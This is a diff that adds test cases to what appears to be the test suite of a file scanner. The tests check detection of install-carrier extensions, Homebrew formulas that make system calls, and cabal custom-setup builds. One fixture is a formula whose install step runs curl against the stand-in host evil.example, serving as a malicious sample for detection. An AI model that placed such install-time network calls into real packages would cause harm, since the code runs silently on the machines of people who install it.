@@ -8110,6 +8110,36 @@ printf '[Encoding]\nInputEncoding=UTF8\n' > "$XDIR/ok.ica"
 ./hlse_core file "$XDIR/ok.ica" 2>&1 | grep -q "ICA LAUNCH" \
     && check "file: encoding-only ica no F48" "0" "1" \
     || check "file: encoding-only ica no F48" "0" "0"
+# F49–F51: install carriers, brew formula exec, cabal custom
+printf 'x\n' > "$XDIR/x.vsix"
+./hlse_core file "$XDIR/x.vsix" 2>&1 | grep -q "INSTALL CARRIER" \
+    && check "file: vsix bundle flagged" "0" "0" \
+    || check "file: vsix bundle flagged" "0" "1"
+printf 'x\n' > "$XDIR/x.cer"
+./hlse_core file "$XDIR/x.cer" 2>&1 | grep -q "INSTALL CARRIER" \
+    && check "file: cert carrier flagged" "0" "0" \
+    || check "file: cert carrier flagged" "0" "1"
+printf 'x\n' > "$XDIR/plain.dat"
+./hlse_core file "$XDIR/plain.dat" 2>&1 | grep -q "INSTALL CARRIER" \
+    && check "file: neutral ext no F49" "0" "1" \
+    || check "file: neutral ext no F49" "0" "0"
+printf 'class X < Formula\n  def install\n    system "curl", "evil.example"\n  end\nend\n' \
+    > "$XDIR/f.rb"
+./hlse_core file "$XDIR/f.rb" 2>&1 | grep -q "BREW FORMULA" \
+    && check "file: formula system-call flagged" "0" "0" \
+    || check "file: formula system-call flagged" "0" "1"
+printf 'class Y < Formula\n  desc "ok"\nend\n' > "$XDIR/ok.rb"
+./hlse_core file "$XDIR/ok.rb" 2>&1 | grep -q "BREW FORMULA" \
+    && check "file: plain formula no F50" "0" "1" \
+    || check "file: plain formula no F50" "0" "0"
+printf 'name: x\nbuild-type: Custom\ncustom-setup\n' > "$XDIR/x.cabal"
+./hlse_core file "$XDIR/x.cabal" 2>&1 | grep -q "CABAL CUSTOM" \
+    && check "file: cabal custom-setup flagged" "0" "0" \
+    || check "file: cabal custom-setup flagged" "0" "1"
+printf 'name: y\nbuild-type: Simple\n' > "$XDIR/ok.cabal"
+./hlse_core file "$XDIR/ok.cabal" 2>&1 | grep -q "CABAL CUSTOM" \
+    && check "file: simple cabal no F51" "0" "1" \
+    || check "file: simple cabal no F51" "0" "0"
 rm -rf "$XDIR"
 
 # ─── results ────────────────────────────────────────────────────────────
